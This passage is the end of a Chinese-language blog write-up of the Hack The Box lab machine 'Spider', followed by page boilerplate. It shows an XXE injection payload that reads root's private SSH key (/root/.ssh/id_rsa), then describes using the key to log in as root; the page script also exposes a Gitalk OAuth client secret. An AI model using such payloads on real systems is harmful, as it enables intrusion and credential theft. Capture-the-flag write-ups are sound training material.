+<p><a href="https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noopener">https://github.com/LucifielHack/PayloadsAllTheThings/tree/master/XXE%20Injection</a></p>
+</blockquote>
+<p>咱们构造一个poc</p>
+<pre><code>username=%26username%3b&amp;version=1.0.0--&gt;&lt;!DOCTYPE+foo+\[&lt;!ENTITY+username+SYSTEM+&quot;/root/.ssh/id\_rsa&quot;&gt;+\]&gt;&lt;!--
+</code></pre>
+<p>然后使用burp抓个包</p>
+<p>然后咱们加入构造的poc</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/5792fa2c-bb02-4b45-a82f-d99dd0a681a1.png" class>
+
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/bab9f47c-5225-4a79-a8c4-7c4a92a22020.png" class>
+
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/f989eb92-b70d-4f9e-b98e-077dc08aa466.png" class>
+
+<p>成功获得root用户的密钥</p>
+<p>咱们保存到本地 使用密钥进行登录</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/83e5d54e-8dd5-4924-a717-c18d37fc3ea2.png" class>
+
+<p>成功登录root权限</p>
+<img src="/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/d47f85a6-e834-4d86-9ed0-b6a751df3c7b.png" class>
+
+<p>成功拿到root权限的flag</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/&title=《Spider - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/&title=《Spider - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Spider - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/06/19/Hackthebox/Hard/Hackthebox-Breadcrumbs/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Breadcrumbs - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/06/16/Hackthebox/Hard/Hackthebox-Tentacle/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Tentacle - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/&title=《Spider - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/&title=《Spider - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Spider - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/17/Hackthebox/Hard/Hackthebox-Spider/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACpklEQVR42u3aQU7lQAwEUO5/aUaaLcynyo6BkV5W6JOk+2XRbVX77S2+3v9eH3/5eLXPvr4z/+/qwsPDwxtN/fV0E0Y+Sj76xznkc8bDw8O75r1eiF+DLzahZPRo88DDw8P7UV4yiXZLmJX1eHh4eP8jr00AnnonHh4e3u/h5UFAvj0kW0IbQBxmLXh4eHgxb7Mo/9Tfh+d7eHh4eItT9dcL7uyYv90qVrPFw8PDO+DlwUG+YcxK6llAnHw4PDw8vAveRV2abCRtO0JeahdIPDw8vJKXx6l56bw59EqK+PwNeHh4eNe8FpAHB7Mp5r//8048PDy8M14bGbShQ9tekBfoX3wsPDw8vDPe7NhpFqTOtqLZERoeHh7eNW/4ijIzzkPbTTGNh4eHd8drY9kHotVR2NE2KwxTZzw8PLyYlx/zb0rkTYTRjv5JuyoeHh7eQ7xZa1S+fCcle1uaFyU4Hh4e3hlvM8AmsJgt90XjLB4eHt4Bbx/dPhvFPtXChYeHh3fHa6eYxKmz6CHfAPJNAg8PD++neJvAIinTn4ow8PDw8L6H1xa1+RTbKCGPPDYfCA8PD+8pXlvU5p1c+YdIWqlmpT8eHh7eBa89nm/vuS7Bi7AYDw8P7yHerKFqFvImpfO+VSsqqfHw8PBGvLZQzgPTdjOYfYgv3oCHh4f3LbzrtDhf1veHYXh4eHgXvLYsni3Ws9B2E0PXj+Hh4eHFvPfy2kSu7UHXYRiBh4eHt45xZ5tEjmmfTYr4JCjBw8PDu+PlbVVte1YSMeRRchtS4OHh4V3z9s1PxZAle5W14OHh4f0ob7Nh5CNujsE+uRMPDw/vF/Da0DYpozctCF98bjw8PLwz3rORQRsQb97/xS94eHh4B7y7BqxZUb4Pc+sLDw8PL+X9AXEgkTY6S8f7AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
